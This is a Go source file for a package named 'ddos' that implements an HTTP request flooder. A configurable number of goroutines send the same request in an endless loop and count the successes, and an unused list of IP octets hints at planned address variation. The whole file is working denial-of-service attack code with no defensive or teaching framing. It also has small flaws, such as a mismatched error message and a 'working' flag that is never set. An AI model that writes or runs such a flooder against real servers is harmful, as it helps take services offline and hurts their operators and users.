package ddos

import (
	"fmt"
	"log"
	"net/http"
	"strconv"
	"sync/atomic"
)

type DDOS struct {
	numberOfWorkers int
	stop            chan struct{}
	ipConstructor   []string
	working         bool

	successRate int64
	totalReqs   int64
}

// Creates dos creator. Number of workers directly affects number of requests
func New(numberOfWorkers int) (*DDOS, error) {
	if numberOfWorkers < 1 {
		return nil, fmt.Errorf("number of workers cannot be less than 0")
	}
	ipConstructor := make([]string, 0, 255)
	for i := range 255 {
		ipConstructor = append(ipConstructor, strconv.Itoa(i))
	}
	return &DDOS{numberOfWorkers: numberOfWorkers, stop: make(chan struct{}), ipConstructor: ipConstructor}, nil
}

// Starts dos
func (d *DDOS) Start(req *http.Request) error {
	if d.working {
		return fmt.Errorf("ddos in process...")
	}
	for range d.numberOfWorkers {
		copyReq := *req
		go d.startWorker(&copyReq)
	}
	return nil
}

// Stops dos
func (d *DDOS) Stop() {
	for range d.numberOfWorkers {
		d.stop <- struct{}{}
	}
}

func (d *DDOS) startWorker(req *http.Request) {
	for {
		select {
		case <-d.stop:
			return
		default:
			atomic.AddInt64(&d.totalReqs, 1)
			client := http.Client{}
			resp, err := client.Do(req)
			if err != nil {
				log.Println(err)
				continue
			}
			if resp.StatusCode != 200 {
				log.Println(resp.StatusCode)
				continue
			}
			atomic.AddInt64(&d.successRate, 1)
		}
	}
}

// Returns total number of requests and number of successfull requests
func (d *DDOS) GetStats() (int, int) {
	return int(d.totalReqs), int(d.successRate)
}
